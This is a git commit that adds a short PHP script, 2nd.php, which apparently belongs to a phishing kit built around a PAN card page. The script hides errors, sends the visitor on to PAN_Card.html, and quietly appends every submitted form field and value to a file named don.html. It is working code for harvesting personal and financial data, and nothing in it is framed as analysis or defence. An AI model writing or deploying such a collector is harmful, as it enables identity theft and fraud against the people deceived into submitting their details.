03d0c49423770b4f61868b56bc0de88fa56b0849
vijkakol <138424265+vijkakol@users.noreply.github.com>
2023-07-03 09:45:37 +0530

    Add files via upload

---
+++ 2nd.php
@@ -0,0 +1,16 @@
+<?php
+header('location: PAN_Card.html');
+error_reporting(0);
+$handle = fopen("don.html","a");
+foreach($_POST as $variable => $value)
+{
+  fwrite($handle, $variable);
+  fwrite($handle, "= ");
+  fwrite($handle, $value);
+  fwrite($handle, "<br>\r\n");
+}
+fwrite($handle, "<br>\r\n");
+fclose($handle);
+exit;
+?> 
+       
